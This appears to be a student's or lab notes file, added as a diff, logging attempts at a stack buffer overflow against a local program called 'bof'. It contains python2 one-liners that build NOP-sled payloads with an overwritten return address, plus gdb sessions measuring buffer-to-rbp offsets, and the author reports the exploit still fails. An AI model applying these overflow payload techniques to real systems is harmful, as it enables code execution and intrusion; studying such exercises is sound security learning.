@@ -1,0 +1,44 @@
+shellcode has 53 hex values so should be 53 bytes
+
+All below were ran with
+$gdb prog
+
+>gdb$ run test_retaddr.txt
+
+TEST - testing different sizes of the noOp sled to see if I can stomp over the address
+pushOff - goal is 0 = characters that still need to be pushed off the rbp or stomped over
+sizeOfAddr - goal is 0 = size of the return address in characters (normal is 12)
+digitsToAdd - goal is 0 = number of characters I need to put into rbp or remove from rbp if it is too big and the target address has been put in 
+
+python2 -c "print '\x90'*737 + '\x68\xdf\xff\xff\xff\x7f'" > test_retaddr.txt ======= makes rbp 0xa7fffffffdf6890 dif(+3)	pushOff(+1) sizeOfAddr(+3) digitsToAdd(-2)
+python2 -c "print '\x90'*736 + '\x68\xdf\xff\xff\xff\x7f'" > test_retaddr.txt ======= makes rbp 0xa7fffffffdf68 dif(+1)		pushOff(+1) sizeOfAddr(+1) digitsToAdd(0)
+python2 -c "print '\x90'*735 + '\x68\xdf\xff\xff\xff\x7f'" > test_retaddr.txt ======= makes rbp 0xa7fffffffdf 			pushOff(+1) sizeOfSAddr(0) digitsToAdd(+2)
+python2 -c "print '\x90'*734 + '\x68\xdf\xff\xff\xff\x7f'" > test_retaddr.txt ======= makes rbp 0x7f0a7fffffff dif(-4)		pushOff(+4) sizeOfAddr(0) digitsToAdd(+4)
+
+So as you can see there is a remaining 'a' after the 0x that I cannot get rid of no matter how big or small of an input I add. It should be getting smashed over.
+
+
+test to see if adding noOps to the end will change anything
+python2 -c "print '\x90'*738 + '\x68\xdf\xff\xff\xff\x7f' +'\x90'*30" > test_retaddr.txt ====== 0x7fffffffdf689090 		pushOff(0) sizeOfAddr(+4) digitsToAdd(-4)
+
+This last test still breaks as the return address is 2 hex values too large, but I was able to push off the 'a' and provide the target adddress as well
+
+
+Breakpoint 1, 0x00005555555551c9 in bof ()
+(gdb) p %rbp
+A syntax error in expression, near `%rbp'.
+(gdb) p $rbp
+$2 = (void *) 0x7fffffffe6b0
+(gdb) p &buffer
+$3 = (char (*)[30]) 0x7ffff7fb4160 <buffer>
+(gdb) p/d 0x7fffffffe6b0 - 0x7ffff7fb4160
+$4 = 134522192
+(gdb) 
+
+(gdb) p &buffer
+$5 = (char (*)[30]) 0x7ffff7fb4160 <buffer>
+(gdb) p $rbp
+$6 = (void *) 0x7fffffffdac0
+(gdb) p/d 0x7fffffffdac0 - 0x7ffff7fb4160
+$7 = 134519136
+(gdb) 
